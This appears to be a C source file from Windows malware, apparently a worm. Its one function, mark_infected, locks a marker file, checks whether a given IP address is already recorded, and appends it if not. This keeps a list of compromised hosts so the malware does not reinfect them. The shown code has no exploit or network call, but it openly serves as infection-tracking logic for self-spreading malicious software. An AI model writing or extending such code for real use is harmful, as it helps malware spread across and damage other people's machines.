#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <stdint.h>
#include <string.h>
#include "config.h"

int mark_infected(const char *ip)
{
    HANDLE file;
    OVERLAPPED lock_overlap;
    unsigned char buffer[8192];
    size_t ip_length;
    uint64_t line_length = 0;
    int line_matches = 1;
    int last_was_cr = 0;
    int infected = 0;
    int locked = 0;
    int result = -1;

    if (ip == NULL)
        return -1;

    ip_length = strlen(ip);
    if (ip_length == 0 || memchr(ip, '\n', ip_length) != NULL ||
        memchr(ip, '\r', ip_length) != NULL)
        return -1;

    memset(&lock_overlap, 0, sizeof(lock_overlap));

    file = CreateFileA(SELF_MARKER,
                       GENERIC_READ | GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                       NULL,
                       OPEN_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);
    if (file == INVALID_HANDLE_VALUE)
        return -1;

    if (!LockFileEx(file, LOCKFILE_EXCLUSIVE_LOCK, 0, 1, 0, &lock_overlap))
        goto cleanup;
    locked = 1;

    if (!SetFilePointerEx(file, (LARGE_INTEGER){0}, NULL, FILE_BEGIN))
        goto cleanup;

    for (;;) {
        DWORD bytes_read = 0;
        DWORD i;

        if (!ReadFile(file, buffer, (DWORD)sizeof(buffer), &bytes_read, NULL))
            goto cleanup;
        if (bytes_read == 0)
            break;

        for (i = 0; i < bytes_read; ++i) {
            unsigned char c = buffer[i];

            if (c == '\n') {
                uint64_t expected_length = (uint64_t)ip_length;

                if (line_matches &&
                    (line_length == expected_length ||
                     (expected_length != UINT64_MAX &&
                      line_length == expected_length + 1 && last_was_cr))) {
                    infected = 1;
                    break;
                }

                line_length = 0;
                line_matches = 1;
                last_was_cr = 0;
                continue;
            }

            if (line_length < (uint64_t)ip_length) {
                if ((unsigned char)ip[(size_t)line_length] != c)
                    line_matches = 0;
            } else if (line_length == (uint64_t)ip_length) {
                if (c != '\r')
                    line_matches = 0;
            } else {
                line_matches = 0;
            }

            if (line_length != UINT64_MAX)
                ++line_length;
            last_was_cr = (c == '\r');
        }

        if (infected)
            break;
    }

    if (infected) {
        result = 1;
        goto cleanup;
    }

    if (line_matches && line_length == (uint64_t)ip_length) {
        result = 1;
        goto cleanup;
    }

    {
        LARGE_INTEGER end_position;

        if (!SetFilePointerEx(file, (LARGE_INTEGER){0}, &end_position, FILE_END))
            goto cleanup;

        {
            size_t offset = 0;

            while (offset < ip_length) {
                size_t remaining = ip_length - offset;
                DWORD to_write = remaining > (size_t)MAXDWORD
                                     ? MAXDWORD
                                     : (DWORD)remaining;
                DWORD bytes_written = 0;

                if (!WriteFile(file, ip + offset, to_write, &bytes_written, NULL) ||
                    bytes_written == 0)
                    goto cleanup;
                offset += bytes_written;
            }
        }

        {
            const char newline = '\n';
            DWORD bytes_written = 0;

            if (!WriteFile(file, &newline, 1, &bytes_written, NULL) ||
                bytes_written != 1)
                goto cleanup;
        }
    }

    result = 0;

cleanup:
    if (locked)
        UnlockFileEx(file, 0, 1, 0, &lock_overlap);
    CloseHandle(file);
    return result;
}